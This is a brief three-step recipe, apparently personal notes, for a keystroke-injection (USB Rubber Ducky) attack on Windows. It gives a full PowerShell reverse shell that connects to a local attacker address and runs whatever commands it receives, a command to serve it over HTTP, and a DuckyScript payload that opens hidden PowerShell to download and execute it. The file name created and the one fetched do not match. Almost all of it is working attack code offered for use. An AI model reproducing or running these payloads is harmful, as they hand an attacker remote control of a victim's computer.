1) Create the reverse_shell.ps1 on your computer 

$client = [System.Net.Sockets.TCPClient]::new('192.168.1.23', 8888)
[byte[]]$bytes = (0..65535).ForEach{ 0 }

$stream = $client.GetStream()
while ($i = $stream.Read($bytes, 0, $bytes.Length)) {
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
    $prompt = $sendback + 'PS ' + $PWD.Path + '> '
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()


2) Turn on a webhosting using python

python -m SimpleHTTPServer 


3) DuckyScript to download and execute the reverse_shell

DELAY 1000
GUI r
DELAY 100
STRING c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://192.168.1.23:8000/rev_sh.ps1')"
ENTER

